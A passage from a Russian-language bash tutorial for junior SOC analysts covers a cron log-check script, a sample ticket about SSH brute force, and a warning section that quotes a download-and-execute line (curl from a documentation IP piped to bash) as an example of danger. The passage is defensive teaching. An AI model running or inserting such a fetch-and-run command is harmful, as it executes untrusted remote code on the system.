Такой скрипт кладут в cron (глава про cron в прошлом учебнике), чтобы он запускался каждую ночь сам. Важно: cron стартует не из твоей папки, поэтому внутри скрипта пути пишут полные (/var/log/auth.log, а не короткое имя), иначе он файл не найдёт. Числа в примере посчитаны по настоящему Linux_2k.log.

В тикет:

Linux_2k.log (combo): nightcheck дал 490 отказов входа по SSH (порог 100 превышен),
главный источник 150.183.249.110 — 80 попыток, все на root. Перебор подтверждён,
прошу заблокировать адрес. Скрипт поставлен в cron на ежедневный прогон.

Копнуть глубже: что скрыто в «безобидном» .sh

Скрипт может выглядеть коротким, а делать много: одна строка curl -s http://203.0.113.9/x | bash скачивает чужой код и сразу выполняет его, ничего не сохраняя на диск (в MITRE это T1105 — доставка инструмента, плюс запуск через интерпретатор T1059.004). Поэтому правило жёсткое: чужой .sh сначала читают cat-ом целиком, разбирают каждую строку — и только L2/форензика решает, запускать ли его в изолированной среде. L1 не запускает никогда. По этой же причине в скрипте опасны строки с curl/wget, ведущие на незнакомый адрес, и | bash / | sh в конце.

Выжимка

  • Скрипт — команды в файле *.sh; первая строка #!/bin/bash (shebang), запуск: chmod +x файл затем ./файл.
  • Чужой скрипт из истории читают (cat), не запускают: запуск — это выполнение чужого кода.
  • for … do … done — повтор для каждого элемента; if [ … ] then … else … fi — ветвление; сравнения буквами (-gt, -eq, пробелы в [ ] обязательны).
  • Конвейер grep | grep -oE | sort | uniq -c | sort -rn | head даёт топ-источников; перед uniq всегда sort.
  • $(команда) — подстановка вывода команды в переменную; так скрипт берёт число отказов и решает по if.
